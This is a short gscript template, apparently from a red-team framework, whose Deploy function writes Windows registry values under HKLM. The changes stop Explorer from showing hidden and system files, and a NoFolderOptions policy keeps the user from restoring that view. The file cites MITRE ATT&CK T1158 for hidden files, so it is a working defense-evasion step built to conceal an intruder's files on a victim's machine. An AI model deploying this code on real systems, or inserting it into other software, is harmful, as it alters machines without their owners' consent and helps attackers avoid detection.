// Example gscript template
// Title: Force Hidden Files
// Author: ahhh
// Purpose: Forces Hidden Files on Windows
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1158#Windows

//priority:105
//timeout:150

//go_import:github.com/gen0cide/gscript/x/windows as windows

function Deploy() {
    console.log("Starting Force Hidden Files");

    var value = 0;
    var value1 = 1;
    // disable showing hidden files
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN", "CheckedValue", value);
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN", "DefaultValue", value);
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL", "CheckedValue", value);
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL", "DefaultValue", value);
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SuperHidden", "CheckedValue", value);
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SuperHidden", "DefaultValue", value);
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFolderOptions", value1);

    console.log("Done Force Hidden Files");
    return true;
  }
  
